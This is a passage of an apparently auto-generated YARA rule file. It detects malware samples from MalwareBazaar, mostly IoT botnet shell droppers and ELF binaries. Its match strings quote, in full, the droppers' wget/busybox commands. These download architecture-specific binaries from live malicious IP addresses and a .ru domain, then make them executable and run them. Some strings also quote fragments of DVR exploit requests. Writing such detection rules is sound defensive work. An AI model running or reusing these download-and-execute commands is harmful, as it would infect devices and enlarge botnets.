      $s17 = "(wget http://217.28.130.78/tt/powerpc -O- || busybox wget http://217.28.130.78/tt/powerpc -O-) > .f; chmod 777 .f; ./.f sscan; >" ascii
      $s18 = "(wget http://217.28.130.78/tt/mipsel -O- || busybox wget http://217.28.130.78/tt/mipsel -O-) > .f; chmod 777 .f; ./.f sscan; > ." ascii
      $s19 = "(wget http://217.28.130.78/tt/armv7l -O- || busybox wget http://217.28.130.78/tt/armv7l -O-) > .f; chmod 777 .f; ./.f sscan; > ." ascii
      $s20 = "(wget http://217.28.130.78/tt/powerpc -O- || busybox wget http://217.28.130.78/tt/powerpc -O-) > .f; chmod 777 .f; ./.f sscan; >" ascii
   condition:
      uint16(0) == 0x2f3e and filesize < 7KB and
      8 of them
}

rule becbafa9c83ad2de51933e44b4883ca7df54c1743a0448ec95fcc22a66eba2c2 {
   meta:
      description = "evidences - file becbafa9c83ad2de51933e44b4883ca7df54c1743a0448ec95fcc22a66eba2c2.sh"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-02"
      hash1 = "becbafa9c83ad2de51933e44b4883ca7df54c1743a0448ec95fcc22a66eba2c2"
   strings:
      $s1 = "(wget http://217.28.130.78/ee/mips -O- || busybox wget http://217.28.130.78/ee/mips -O-) > .f; chmod 777 .f; ./.f escan; > .f; #" ascii
      $s2 = "(wget http://217.28.130.78/ee/sparc -O- || busybox wget http://217.28.130.78/ee/sparc -O-) > .f; chmod 777 .f; ./.f escan; > .f;" ascii
      $s3 = "(wget http://217.28.130.78/ee/armv5l -O- || busybox wget http://217.28.130.78/ee/armv5l -O-) > .f; chmod 777 .f; ./.f escan; > ." ascii
      $s4 = "(wget http://217.28.130.78/ee/powerpc -O- || busybox wget http://217.28.130.78/ee/powerpc -O-) > .f; chmod 777 .f; ./.f escan; >" ascii
      $s5 = "(wget http://217.28.130.78/ee/armv4l -O- || busybox wget http://217.28.130.78/ee/armv4l -O-) > .f; chmod 777 .f; ./.f escan; > ." ascii
      $s6 = "(wget http://217.28.130.78/ee/powerpc -O- || busybox wget http://217.28.130.78/ee/powerpc -O-) > .f; chmod 777 .f; ./.f escan; >" ascii
      $s7 = "(wget http://217.28.130.78/ee/armv7l -O- || busybox wget http://217.28.130.78/ee/armv7l -O-) > .f; chmod 777 .f; ./.f escan; > ." ascii
      $s8 = "(wget http://217.28.130.78/ee/armv5l -O- || busybox wget http://217.28.130.78/ee/armv5l -O-) > .f; chmod 777 .f; ./.f escan; > ." ascii
      $s9 = "(wget http://217.28.130.78/ee/sparc -O- || busybox wget http://217.28.130.78/ee/sparc -O-) > .f; chmod 777 .f; ./.f escan; > .f;" ascii
      $s10 = "(wget http://217.28.130.78/ee/armv7l -O- || busybox wget http://217.28.130.78/ee/armv7l -O-) > .f; chmod 777 .f; ./.f escan; > ." ascii
      $s11 = "(wget http://217.28.130.78/ee/riscv32 -O- || busybox wget http://217.28.130.78/ee/riscv32 -O-) > .f; chmod 777 .f; ./.f escan; >" ascii
      $s12 = "(wget http://217.28.130.78/ee/sh4 -O- || busybox wget http://217.28.130.78/ee/sh4 -O-) > .f; chmod 777 .f; ./.f escan; > .f; # ;" ascii
      $s13 = "(wget http://217.28.130.78/ee/mipsel -O- || busybox wget http://217.28.130.78/ee/mipsel -O-) > .f; chmod 777 .f; ./.f escan; > ." ascii
      $s14 = "(wget http://217.28.130.78/ee/armv6l -O- || busybox wget http://217.28.130.78/ee/armv6l -O-) > .f; chmod 777 .f; ./.f escan; > ." ascii
      $s15 = "(wget http://217.28.130.78/ee/mipsel -O- || busybox wget http://217.28.130.78/ee/mipsel -O-) > .f; chmod 777 .f; ./.f escan; > ." ascii
      $s16 = "(wget http://217.28.130.78/ee/arc -O- || busybox wget http://217.28.130.78/ee/arc -O-) > .f; chmod 777 .f; ./.f escan; > .f; # ;" ascii
      $s17 = "(wget http://217.28.130.78/ee/armv4eb -O- || busybox wget http://217.28.130.78/ee/armv4eb -O-) > .f; chmod 777 .f; ./.f escan; >" ascii
      $s18 = "(wget http://217.28.130.78/ee/mips -O- || busybox wget http://217.28.130.78/ee/mips -O-) > .f; chmod 777 .f; ./.f escan; > .f; #" ascii
      $s19 = "(wget http://217.28.130.78/ee/armv6l -O- || busybox wget http://217.28.130.78/ee/armv6l -O-) > .f; chmod 777 .f; ./.f escan; > ." ascii
      $s20 = "(wget http://217.28.130.78/ee/arc -O- || busybox wget http://217.28.130.78/ee/arc -O-) > .f; chmod 777 .f; ./.f escan; > .f; # ;" ascii
   condition:
      uint16(0) == 0x2f3e and filesize < 7KB and
      8 of them
}

rule fcd28c29953b6f148c0cd7ac7018e9224baca22ef608c1b6995cd5c986acb5df {
   meta:
      description = "evidences - file fcd28c29953b6f148c0cd7ac7018e9224baca22ef608c1b6995cd5c986acb5df.sh"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-02"
      hash1 = "fcd28c29953b6f148c0cd7ac7018e9224baca22ef608c1b6995cd5c986acb5df"
   strings:
      $s1 = "(wget http://217.28.130.78/vv/armv4eb -O- || busybox wget http://217.28.130.78/vv/armv4eb -O-) > .f; chmod 777 .f; ./.f rooster;" ascii
      $s2 = "(wget http://217.28.130.78/vv/armv5l -O- || busybox wget http://217.28.130.78/vv/armv5l -O-) > .f; chmod 777 .f; ./.f rooster; >" ascii
      $s3 = "(wget http://217.28.130.78/vv/armv7l -O- || busybox wget http://217.28.130.78/vv/armv7l -O-) > .f; chmod 777 .f; ./.f rooster; >" ascii
      $s4 = "(wget http://217.28.130.78/vv/sh4 -O- || busybox wget http://217.28.130.78/vv/sh4 -O-) > .f; chmod 777 .f; ./.f rooster; > .f; #" ascii
      $s5 = "(wget http://217.28.130.78/vv/arc -O- || busybox wget http://217.28.130.78/vv/arc -O-) > .f; chmod 777 .f; ./.f rooster; > .f; #" ascii
      $s6 = "(wget http://217.28.130.78/vv/i686 -O- || busybox wget http://217.28.130.78/vv/i686 -O-) > .f; chmod 777 .f; ./.f ssh; > .f; # ;" ascii
      $s7 = "(wget http://217.28.130.78/vv/i686 -O- || busybox wget http://217.28.130.78/vv/i686 -O-) > .f; chmod 777 .f; ./.f ssh; > .f; # ;" ascii
      $s8 = "(wget http://217.28.130.78/vv/sh4 -O- || busybox wget http://217.28.130.78/vv/sh4 -O-) > .f; chmod 777 .f; ./.f rooster; > .f; #" ascii
      $s9 = "(wget http://217.28.130.78/vv/mips -O- || busybox wget http://217.28.130.78/vv/mips -O-) > .f; chmod 777 .f; ./.f rooster; > .f;" ascii
      $s10 = "(wget http://217.28.130.78/vv/armv6l -O- || busybox wget http://217.28.130.78/vv/armv6l -O-) > .f; chmod 777 .f; ./.f rooster; >" ascii
      $s11 = "(wget http://217.28.130.78/vv/mipsel -O- || busybox wget http://217.28.130.78/vv/mipsel -O-) > .f; chmod 777 .f; ./.f rooster; >" ascii
      $s12 = "(wget http://217.28.130.78/vv/mips -O- || busybox wget http://217.28.130.78/vv/mips -O-) > .f; chmod 777 .f; ./.f rooster; > .f;" ascii
      $s13 = "(wget http://217.28.130.78/vv/superh-O- || busybox wget http://217.28.130.78/vv/superh -O-) > .f; chmod 777 .f; ./.f rooster; > " ascii
      $s14 = "(wget http://217.28.130.78/vv/riscv32 -O- || busybox wget http://217.28.130.78/vv/riscv32 -O-) > .f; chmod 777 .f; ./.f rooster;" ascii
      $s15 = "(wget http://217.28.130.78/vv/armv5l -O- || busybox wget http://217.28.130.78/vv/armv5l -O-) > .f; chmod 777 .f; ./.f rooster; >" ascii
      $s16 = "(wget http://217.28.130.78/vv/powerpc -O- || busybox wget http://217.28.130.78/vv/powerpc -O-) > .f; chmod 777 .f; ./.f rooster;" ascii
      $s17 = "(wget http://217.28.130.78/vv/sparc -O- || busybox wget http://217.28.130.78/vv/sparc -O-) > .f; chmod 777 .f; ./.f rooster; > ." ascii
      $s18 = "(wget http://217.28.130.78/vv/sparc -O- || busybox wget http://217.28.130.78/vv/sparc -O-) > .f; chmod 777 .f; ./.f rooster; > ." ascii
      $s19 = "(wget http://217.28.130.78/vv/armv7l -O- || busybox wget http://217.28.130.78/vv/armv7l -O-) > .f; chmod 777 .f; ./.f rooster; >" ascii
      $s20 = "(wget http://217.28.130.78/vv/armv4eb -O- || busybox wget http://217.28.130.78/vv/armv4eb -O-) > .f; chmod 777 .f; ./.f rooster;" ascii
   condition:
      uint16(0) == 0x2f3e and filesize < 7KB and
      8 of them
}

rule sig_7fcef83866e5c5631c48bdc17d3438580f20c35920a81003298339c4f6a527e2 {
   meta:
      description = "evidences - file 7fcef83866e5c5631c48bdc17d3438580f20c35920a81003298339c4f6a527e2.sh"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-02"
      hash1 = "7fcef83866e5c5631c48bdc17d3438580f20c35920a81003298339c4f6a527e2"
   strings:
      $s1 = "(wget http://217.28.130.78/vv/sparc -O- || busybox wget http://217.28.130.78/vv/sparc -O-) > .f; chmod 777 .f; ./.f router; > .f" ascii
      $s2 = "(wget http://217.28.130.78/vv/riscv32 -O- || busybox wget http://217.28.130.78/vv/riscv32 -O-) > .f; chmod 777 .f; ./.f router; " ascii
      $s3 = "(wget http://217.28.130.78/vv/armv4l -O- || busybox wget http://217.28.130.78/vv/armv4l -O-) > .f; chmod 777 .f; ./.f router; > " ascii
      $s4 = "(wget http://217.28.130.78/vv/armv6l -O- || busybox wget http://217.28.130.78/vv/armv6l -O-) > .f; chmod 777 .f; ./.f router; > " ascii
      $s5 = "(wget http://217.28.130.78/vv/powerpc -O- || busybox wget http://217.28.130.78/vv/powerpc -O-) > .f; chmod 777 .f; ./.f router; " ascii
      $s6 = "(wget http://217.28.130.78/vv/armv7l -O- || busybox wget http://217.28.130.78/vv/armv7l -O-) > .f; chmod 777 .f; ./.f router; > " ascii
      $s7 = "(wget http://217.28.130.78/vv/arc -O- || busybox wget http://217.28.130.78/vv/arc -O-) > .f; chmod 777 .f; ./.f router; > .f; # " ascii
      $s8 = "(wget http://217.28.130.78/vv/armv4l -O- || busybox wget http://217.28.130.78/vv/armv4l -O-) > .f; chmod 777 .f; ./.f router; > " ascii
      $s9 = "(wget http://217.28.130.78/vv/armv6l -O- || busybox wget http://217.28.130.78/vv/armv6l -O-) > .f; chmod 777 .f; ./.f router; > " ascii
      $s10 = "(wget http://217.28.130.78/vv/mips -O- || busybox wget http://217.28.130.78/vv/mips -O-) > .f; chmod 777 .f; ./.f router; > .f; " ascii
      $s11 = "(wget http://217.28.130.78/vv/sh4 -O- || busybox wget http://217.28.130.78/vv/sh4 -O-) > .f; chmod 777 .f; ./.f router; > .f; # " ascii
      $s12 = "(wget http://217.28.130.78/vv/armv4eb -O- || busybox wget http://217.28.130.78/vv/armv4eb -O-) > .f; chmod 777 .f; ./.f router; " ascii
      $s13 = "(wget http://217.28.130.78/vv/armv7l -O- || busybox wget http://217.28.130.78/vv/armv7l -O-) > .f; chmod 777 .f; ./.f router; > " ascii
      $s14 = "(wget http://217.28.130.78/vv/mipsel -O- || busybox wget http://217.28.130.78/vv/mipsel -O-) > .f; chmod 777 .f; ./.f router; > " ascii
      $s15 = "(wget http://217.28.130.78/vv/mipsel -O- || busybox wget http://217.28.130.78/vv/mipsel -O-) > .f; chmod 777 .f; ./.f router; > " ascii
      $s16 = "(wget http://217.28.130.78/vv/armv4eb -O- || busybox wget http://217.28.130.78/vv/armv4eb -O-) > .f; chmod 777 .f; ./.f router; " ascii
      $s17 = "(wget http://217.28.130.78/vv/armv5l -O- || busybox wget http://217.28.130.78/vv/armv5l -O-) > .f; chmod 777 .f; ./.f router; > " ascii
      $s18 = "(wget http://217.28.130.78/vv/armv5l -O- || busybox wget http://217.28.130.78/vv/armv5l -O-) > .f; chmod 777 .f; ./.f router; > " ascii
      $s19 = "(wget http://217.28.130.78/vv/riscv32 -O- || busybox wget http://217.28.130.78/vv/riscv32 -O-) > .f; chmod 777 .f; ./.f router; " ascii
      $s20 = "(wget http://217.28.130.78/vv/arc -O- || busybox wget http://217.28.130.78/vv/arc -O-) > .f; chmod 777 .f; ./.f router; > .f; # " ascii
   condition:
      uint16(0) == 0x2f3e and filesize < 7KB and
      8 of them
}

rule e432fc214accbdb91b92412c5021a599754808f09d7be16cc8f1b853fa1431cc {
   meta:
      description = "evidences - file e432fc214accbdb91b92412c5021a599754808f09d7be16cc8f1b853fa1431cc.sh"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-02"
      hash1 = "e432fc214accbdb91b92412c5021a599754808f09d7be16cc8f1b853fa1431cc"
   strings:
      $s1 = "(wget http://217.28.130.78/vv/armv5l -O- || busybox wget http://217.28.130.78/vv/armv5l -O-) > .f; chmod 777 .f; ./.f tvt; > .f;" ascii
      $s2 = "(wget http://217.28.130.78/vv/armv4l -O- || busybox wget http://217.28.130.78/vv/armv4l -O-) > .f; chmod 777 .f; ./.f tvt; > .f;" ascii
      $s3 = "(wget http://217.28.130.78/vv/armv6l -O- || busybox wget http://217.28.130.78/vv/armv6l -O-) > .f; chmod 777 .f; ./.f tvt; > .f;" ascii
      $s4 = "(wget http://217.28.130.78/vv/armv7l -O- || busybox wget http://217.28.130.78/vv/armv7l -O-) > .f; chmod 777 .f; ./.f tvt; > .f;" ascii
      $s5 = "(wget http://217.28.130.78/vv/armv6l -O- || busybox wget http://217.28.130.78/vv/armv6l -O-) > .f; chmod 777 .f; ./.f tvt; > .f;" ascii
      $s6 = "(wget http://217.28.130.78/vv/armv4l -O- || busybox wget http://217.28.130.78/vv/armv4l -O-) > .f; chmod 777 .f; ./.f tvt; > .f;" ascii
      $s7 = "(wget http://217.28.130.78/vv/armv5l -O- || busybox wget http://217.28.130.78/vv/armv5l -O-) > .f; chmod 777 .f; ./.f tvt; > .f;" ascii
      $s8 = "(wget http://217.28.130.78/vv/armv7l -O- || busybox wget http://217.28.130.78/vv/armv7l -O-) > .f; chmod 777 .f; ./.f tvt; > .f;" ascii
      $s9 = " # ; rm -rf .f;" fullword ascii
      $s10 = "echo \"$0 FIN\";" fullword ascii
   condition:
      uint16(0) == 0x2f3e and filesize < 3KB and
      all of them
}

rule sig_502c9f41045c9e1e2f47c99530a41ab9b92eed7e2b2eacf387182c2be91258b8 {
   meta:
      description = "evidences - file 502c9f41045c9e1e2f47c99530a41ab9b92eed7e2b2eacf387182c2be91258b8.sh"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-02"
      hash1 = "502c9f41045c9e1e2f47c99530a41ab9b92eed7e2b2eacf387182c2be91258b8"
   strings:
      $s1 = "(wget http://103.188.82.218/v/arm -O- || busybox wget http://103.188.82.218/v/arm -O-) > .f; chmod 777 .f; ./.f xvr; > .f; # ; r" ascii
      $s2 = "(wget http://103.188.82.218/v/arm -O- || busybox wget http://103.188.82.218/v/arm -O-) > .f; chmod 777 .f; ./.f xvr; > .f; # ; r" ascii
      $s3 = "(wget http://103.188.82.218/v/arm5 -O- || busybox wget http://103.188.82.218/v/arm5 -O-) > .f; chmod 777 .f; ./.f xvr; > .f; # ;" ascii
      $s4 = "(wget http://103.188.82.218/v/arm7 -O- || busybox wget http://103.188.82.218/v/arm7 -O-) > .f; chmod 777 .f; ./.f xvr; > .f; # ;" ascii
      $s5 = "(wget http://103.188.82.218/v/arm5 -O- || busybox wget http://103.188.82.218/v/arm5 -O-) > .f; chmod 777 .f; ./.f xvr; > .f; # ;" ascii
      $s6 = "(wget http://103.188.82.218/v/arm7 -O- || busybox wget http://103.188.82.218/v/arm7 -O-) > .f; chmod 777 .f; ./.f xvr; > .f; # ;" ascii
      $s7 = "(wget http://103.188.82.218/v/arm6 -O- || busybox wget http://103.188.82.218/v/arm6 -O-) > .f; chmod 777 .f; ./.f xvr; > .f; # ;" ascii
      $s8 = "(wget http://103.188.82.218/v/arm6 -O- || busybox wget http://103.188.82.218/v/arm6 -O-) > .f; chmod 777 .f; ./.f xvr; > .f; # ;" ascii
      $s9 = " rm -rf .f;" fullword ascii
      $s10 = "m -rf .f;" fullword ascii
   condition:
      uint16(0) == 0x2f3e and filesize < 2KB and
      all of them
}

rule sig_0ebe4354a45759e6c84ba527f0a07a935aa8d4065a4e824183696fc7ce6d5b7a {
   meta:
      description = "evidences - file 0ebe4354a45759e6c84ba527f0a07a935aa8d4065a4e824183696fc7ce6d5b7a.sh"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-02"
      hash1 = "0ebe4354a45759e6c84ba527f0a07a935aa8d4065a4e824183696fc7ce6d5b7a"
   strings:
      $s1 = "wget http://nouuu.eye-network.ru/qbfwdbg; chmod 777 qbfwdbg; ./qbfwdbg telnet" fullword ascii
      $s2 = "wget http://nouuu.eye-network.ru/vevhea4; chmod 777 vevhea4; ./vevhea4 telnet" fullword ascii
      $s3 = "wget http://nouuu.eye-network.ru/wlw68k; chmod 777 wlw68k; ./wlw68k telnet" fullword ascii
      $s4 = "wget http://nouuu.eye-network.ru/ngwa5; chmod 777 ngwa5; ./ngwa5 telnet" fullword ascii
      $s5 = "wget http://nouuu.eye-network.ru/jefne64; chmod 777 jefne64; ./jefne64 telnet" fullword ascii
      $s6 = "wget http://nouuu.eye-network.ru/ivwebcda7; chmod 777 ivwebcda7; ./ivwebcda7 telnet" fullword ascii
      $s7 = "wget http://nouuu.eye-network.ru/debvps; chmod 777 debvps; ./debvps telnet" fullword ascii
      $s8 = "wget http://nouuu.eye-network.ru/fbhervbhsl; chmod 777 fbhervbhsl; ./fbhervbhsl telnet" fullword ascii
      $s9 = "wget http://nouuu.eye-network.ru/fqkjei686; chmod 777 fqkjei686; ./fqkjei686 telnet" fullword ascii
      $s10 = "wget http://nouuu.eye-network.ru/gnjqwpc; chmod 777 gnjqwpc; ./gnjqwpc telnet" fullword ascii
      $s11 = "wget http://nouuu.eye-network.ru/woega6; chmod 777 woega6; ./woega6 telnet" fullword ascii
      $s12 = "wget http://nouuu.eye-network.ru/wrjkngh4; chmod 777 wrjkngh4; ./wrjkngh4 telnet" fullword ascii
      $s13 = "wget http://nouuu.eye-network.ru/wev86; chmod 777 wev86; ./wev86 telnet" fullword ascii
   condition:
      uint16(0) == 0x6777 and filesize < 3KB and
      8 of them
}

rule sig_0fd3605f5f1625a299d4c9684c3d9c227b7713b4de5d940d85739e9b8772f601 {
   meta:
      description = "evidences - file 0fd3605f5f1625a299d4c9684c3d9c227b7713b4de5d940d85739e9b8772f601.gz"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-02"
      hash1 = "0fd3605f5f1625a299d4c9684c3d9c227b7713b4de5d940d85739e9b8772f601"
   strings:
      $s1 = "PO#5_Tower_049.bat" fullword ascii
      $s2 = "* )F!)" fullword ascii
      $s3 = "/c:\\$t" fullword ascii
      $s4 = "Chine_ana881673D241953193D72316FF35416527FF586897loodatke.PNG" fullword ascii
      $s5 = "PNGMSCF" fullword ascii
      $s6 = ":0ISPy}" fullword ascii
      $s7 = "\\j|PZQI>5>," fullword ascii
      $s8 = "W\"X -Nv]" fullword ascii
      $s9 = "# j`wg" fullword ascii
      $s10 = "D[!s- " fullword ascii
      $s11 = "fS%Z%S%3" fullword ascii
      $s12 = "\\vvQBwbVk" fullword ascii
      $s13 = "UUbHF4}f" fullword ascii
      $s14 = "ugaC5<Q4" fullword ascii
      $s15 = "BxJyY68l" fullword ascii
      $s16 = "ercMXsu" fullword ascii
      $s17 = ")Pvdz;%6" fullword ascii
      $s18 = "nYjQQ=4dT" fullword ascii
      $s19 = "cBBlxh<E" fullword ascii
      $s20 = "JUbJmsGrN" fullword ascii
   condition:
      uint16(0) == 0x4e50 and filesize < 2000KB and
      8 of them
}

rule sig_947d94994555662758c6ad57ec25672e40ce688e135e9b81090d1d58b34392b2 {
   meta:
      description = "evidences - file 947d94994555662758c6ad57ec25672e40ce688e135e9b81090d1d58b34392b2.elf"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-02"
      hash1 = "947d94994555662758c6ad57ec25672e40ce688e135e9b81090d1d58b34392b2"
   strings:
      $s1 = "?33333333" fullword ascii /* reversed goodware string '33333333?' */ /* hex encoded string '3333' */
      $s2 = "getgrouplist(,, [%u,%u], [%d]) -> %d" fullword ascii
      $s3 = "(old_top == (((mbinptr) (((char *) &((av)->bins[((1) - 1) * 2])) - __builtin_offsetof (struct malloc_chunk, fd)))) && old_size =" ascii
      $s4 = "relocation processing: %s%s" fullword ascii
      $s5 = "(old_top == (((mbinptr) (((char *) &((av)->bins[((1) - 1) * 2])) - __builtin_offsetof (struct malloc_chunk, fd)))) && old_size =" ascii
      $s6 = "%s: line %d: bad command `%s'" fullword ascii
      $s7 = "*** glibc detected *** %s: %s: 0x%s ***" fullword ascii
      $s8 = "!victim || ((((mchunkptr)((char*)(victim) - 2*(sizeof(size_t)))))->size & 0x2) || ar_ptr == (((((mchunkptr)((char*)(victim) - 2*" ascii
      $s9 = "(sizeof(size_t)))))->size & 0x4) ? ((heap_info *)((unsigned long)(((mchunkptr)((char*)(victim) - 2*(sizeof(size_t))))) & ~((2 * " ascii
      $s10 = "!victim || ((((mchunkptr)((char*)(victim) - 2*(sizeof(size_t)))))->size & 0x2) || ar_ptr == (((((mchunkptr)((char*)(victim) - 2*" ascii
      $s11 = "%s%s%s:%u: %s%sAssertion `%s' failed." fullword ascii
      $s12 = "getgrouplist(,, [], [%d]) -> %d" fullword ascii
      $s13 = "getgrouplist(,, [%u], [%d]) -> %d" fullword ascii
      $s14 = "getpeername(, {%s}, {%u}) -> %d" fullword ascii
      $s15 = "getsockname(, {%s}, {%u}) -> %d" fullword ascii
      $s16 = "securityencryptiontransport" fullword ascii
      $s17 = "size_t)(const void *)((&zone_names[info->idx]) + 1) - (size_t)(const void *)(&zone_names[info->idx]) == 1) || __s1_len >= 4) && " ascii
      $s18 = "ELF load command address/offset not properly aligned" fullword ascii
      $s19 = "((struct pthread *)__builtin_thread_pointer () - 1)->tid == ppid" fullword ascii
      $s20 = "_t)(const void *)((&zone_names[info->idx]) + 1) - (size_t)(const void *)(&zone_names[info->idx]) == 1) && (__s1_len = __builtin_" ascii
   condition:
      uint16(0) == 0x457f and filesize < 3000KB and
      8 of them
}

rule sig_22b8bb65ff649d6a33b4ef9e216c0f7560b52014d6ae5a3817880e1bd6a12bfa {
   meta:
      description = "evidences - file 22b8bb65ff649d6a33b4ef9e216c0f7560b52014d6ae5a3817880e1bd6a12bfa.elf"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-02"
      hash1 = "22b8bb65ff649d6a33b4ef9e216c0f7560b52014d6ae5a3817880e1bd6a12bfa"
   strings:
      $s1 = "-u username -- run command as username handling setuid and/or setgid" fullword ascii
      $s2 = "-p pid -- trace process with process id PID, may be repeated" fullword ascii
      $s3 = "-D -- run tracer process as a detached grandchild, not as parent" fullword ascii
      $s4 = "*** Error in `%s': %s: 0x%s ***" fullword ascii
      $s5 = "-E var -- remove var from the environment for command" fullword ascii
      $s6 = "-E var=val -- put var=val in the environment for command" fullword ascii
      $s7 = "TLS generation counter wrapped!  Please report as described in <https://sourcery.mentor.com/GNUToolchain/>." fullword ascii
      $s8 = "?33333333" fullword ascii /* reversed goodware string '33333333?' */ /* hex encoded string '3333' */
      $s9 = "PR_GET_DUMPABLE" fullword ascii
      $s10 = "(old_top == (((mbinptr) (((char *) &((av)->bins[((1) - 1) * 2])) - __builtin_offsetof (struct malloc_chunk, fd)))) && old_size =" ascii
      $s11 = "relocation processing: %s%s" fullword ascii
      $s12 = "(old_top == (((mbinptr) (((char *) &((av)->bins[((1) - 1) * 2])) - __builtin_offsetof (struct malloc_chunk, fd)))) && old_size =" ascii
      $s13 = "Invalid process id: '%s'" fullword ascii
      $s14 = "-y -- print paths associated with file descriptor arguments" fullword ascii
      $s15 = "Process %d attached" fullword ascii
      $s16 = "!victim || ((((mchunkptr)((char*)(victim) - 2*(sizeof(size_t)))))->size & 0x2) || ar_ptr == (((((mchunkptr)((char*)(victim) - 2*" ascii
      $s17 = "(sizeof(size_t)))))->size & 0x4) ? ((heap_info *)((unsigned long)(((mchunkptr)((char*)(victim) - 2*(sizeof(size_t))))) & ~((2 * " ascii
      $s18 = " && WCOREDUMP(s)" fullword ascii
      $s19 = "!victim || ((((mchunkptr)((char*)(victim) - 2*(sizeof(size_t)))))->size & 0x2) || ar_ptr == (((((mchunkptr)((char*)(victim) - 2*" ascii
      $s20 = "%s%s%s:%u: %s%sAssertion `%s' failed." fullword ascii
   condition:
      uint16(0) == 0x457f and filesize < 2000KB and
      8 of them
}

rule sig_87cdb7008b20cb3100cd180108607a31a644a4eadf4184c91054f4df1e6d61d8 {
   meta:
      description = "evidences - file 87cdb7008b20cb3100cd180108607a31a644a4eadf4184c91054f4df1e6d61d8.elf"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-02"
      hash1 = "87cdb7008b20cb3100cd180108607a31a644a4eadf4184c91054f4df1e6d61d8"
   strings:
      $s1 = "ash|login|wget|curl|tftp|ntpdate|ftp" fullword ascii
      $s2 = "/home/process" fullword ascii
      $s3 = "/usr/libexec/" fullword ascii
      $s4 = "Remote I/O error" fullword ascii
      $s5 = "/system/system/bin/" fullword ascii
      $s6 = "/proc/%s/status" fullword ascii
      $s7 = "/lib/systemd/" fullword ascii
      $s8 = "/usr/lib/systemd" fullword ascii
      $s9 = "Protocol error" fullword ascii /* Goodware String - occured 26 times */
      $s10 = "Protocol not supported" fullword ascii /* Goodware String - occured 73 times */
      $s11 = "Connection refused" fullword ascii /* Goodware String - occured 127 times */
      $s12 = "Broken pipe" fullword ascii /* Goodware String - occured 742 times */
      $s13 = "Permission denied" fullword ascii /* Goodware String - occured 823 times */
      $s14 = "Not a XENIX named type file" fullword ascii
      $s15 = "Structure needs cleaning" fullword ascii
      $s16 = "/proc/" fullword ascii /* Goodware String - occured 1 times */
      $s17 = "Unknown error " fullword ascii /* Goodware String - occured 1 times */
      $s18 = "Is a named type file" fullword ascii
      $s19 = "No XENIX semaphores available" fullword ascii
      $s20 = " (deleted)" fullword ascii
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      8 of them
}

rule sig_2ec8b8dadec67d51de84561f7bfd8fba2c446eb1735b2a1efb32e6ea63b7f76d {
   meta:
      description = "evidences - file 2ec8b8dadec67d51de84561f7bfd8fba2c446eb1735b2a1efb32e6ea63b7f76d.elf"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-02"
      hash1 = "2ec8b8dadec67d51de84561f7bfd8fba2c446eb1735b2a1efb32e6ea63b7f76d"
   strings:
      $s1 = "User-Agent: Mozilla/5.0 (Linux; U; Android 4.0.3; ko-kr; LG-L160L Build/IML74K) AppleWebkit/534.30 (KHTML, like Gecko) Version/4" ascii
      $s2 = "User-Agent: Mozilla/5.0 (Linux; U; Android 4.0.3; ko-kr; LG-L160L Build/IML74K) AppleWebkit/534.30 (KHTML, like Gecko) Version/4" ascii
      $s3 = "/phone/login.html" fullword ascii
      $s4 = "authkey" fullword ascii
      $s5 = "Host: 127.0.0.1" fullword ascii
      $s6 = "ofwversion" fullword ascii
      $s7 = "/cgi-bin/check_auth.json" fullword ascii
      $s8 = "{ \"Name\" : \"OPSystemUpgrade\", \"OPSystemUpgrade\" : { \"Action\" : \"Start\", \"Type\" : \"System\" }, \"SessionID\" : \"0x0" ascii
      $s9 = "/cgi-bin/index2.asp" fullword ascii
      $s10 = "/cgi-bin/?ogin.asp" fullword ascii
      $s11 = "t{|}f&~gq{&fdt{|}f9&d&oggodm&kget{|}f:&d&oggodm&kget{|}f;&d&oggodm&kget{|}f<&d&oggodm&kget{|}f&~gax{|}f|&kget{|}f&{axfm|&fm|" fullword ascii
      $s12 = "o?head-?ebs" fullword ascii
      $s13 = "sellanguage" fullword ascii
      $s14 = "labusrname" fullword ascii
      $s15 = "/sys/devices/system/cpu" fullword ascii
      $s16 = "?ages/?ogin.htm" fullword ascii
      $s17 = "doc/script" fullword ascii
      $s18 = "IsRemote=1" fullword ascii
      $s19 = "{ \"Ret\" : 100, \"SessionID\" : \"0x0\" }" fullword ascii
      $s20 = "?ogin.rsp" fullword ascii
   condition:
      uint16(0) == 0x457f and filesize < 300KB and
      8 of them
}

rule a277c112c2cd719999caadc40f533aec8bb4a4872841e1f739eca14aa9d2e6bd {
   meta:
      description = "evidences - file a277c112c2cd719999caadc40f533aec8bb4a4872841e1f739eca14aa9d2e6bd.elf"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-02"
      hash1 = "a277c112c2cd719999caadc40f533aec8bb4a4872841e1f739eca14aa9d2e6bd"
   strings:
      $s1 = "User-Agent: Mozilla/5.0 (Linux; U; Android 4.0.3; ko-kr; LG-L160L Build/IML74K) AppleWebkit/534.30 (KHTML, like Gecko) Version/4" ascii
      $s2 = "User-Agent: Mozilla/5.0 (Linux; U; Android 4.0.3; ko-kr; LG-L160L Build/IML74K) AppleWebkit/534.30 (KHTML, like Gecko) Version/4" ascii
      $s3 = "/phone/login.html" fullword ascii
      $s4 = "authkey" fullword ascii
      $s5 = "Host: 127.0.0.1" fullword ascii
      $s6 = "ofwversion" fullword ascii
      $s7 = "/cgi-bin/check_auth.json" fullword ascii
